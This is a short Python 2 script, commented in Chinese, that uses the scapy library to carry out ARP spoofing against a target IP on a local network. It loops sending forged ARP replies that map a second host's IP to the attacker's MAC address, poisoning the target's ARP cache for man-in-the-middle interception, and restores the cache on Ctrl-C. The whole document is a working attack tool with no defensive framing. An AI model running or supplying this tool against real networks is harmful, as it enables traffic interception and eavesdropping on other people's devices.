# -*- coding:utf-8 -*-
from scapy.all import *
from get_mac import get_mac_address
from get_ip import get_ip_address
import signal
import time
from arp_det import get_arp
def arp_spoof(ip1,ip2,ifname='eth0'):
    global localip,localmac,ip1_mac,ip2_mac,g_ip1,g_ip2,g_ifname
    g_ip1 = ip1  #被毒化的目标设备
    g_ip2 = ip2   #本机伪造的设备
    g_ifname = ifname
    localip = get_ip_address(g_ifname)  #本机ip

    localmac = get_mac_address(g_ifname)   #本机mac
    ip1_mac = get_arp(ip1,ifname)   #获取ip1的真实mac
    ip2_mac = get_arp(ip2,ifname)   #获取ip2的真实mac
    signal.signal(signal.SIGINT,handle)
    #如果捕获到信号就终止进程并执行handle函数，否则持续进行攻击
    while 1:
        sendp(Ether(src=localmac,dst=ip1_mac)/ARP(op=2,hwsrc=localmac,hwdst=ip1_mac,psrc=g_ip2,pdst=g_ip1),iface=g_ifname,verbose=False)
        print '[+]正在发送arp数据包 欺骗'+ip1+'本地mac地址为'+ip2+'的mac地址'
def handle(signum,frame):
    global localip,localmac,ip1_mac,ip2_mac,g_ip1,g_ip2,g_ifname
    print '正在执行恢复操作...'
    sendp(Ether(src=ip2_mac,dst=ip1_mac)/ARP(op=2,hwsrc=ip2_mac,hwdst=ip1_mac,psrc=g_ip2,pdst=g_ip1),iface=g_ifname,verbose=False)
    print '已经恢复'+g_ip1+'的ARP缓存'
    sys.exit()

if __name__ == '__main__':
    import sys
    ip1 = sys.argv[1]
    ip2 = sys.argv[2]
    arp_spoof(ip1,ip2)

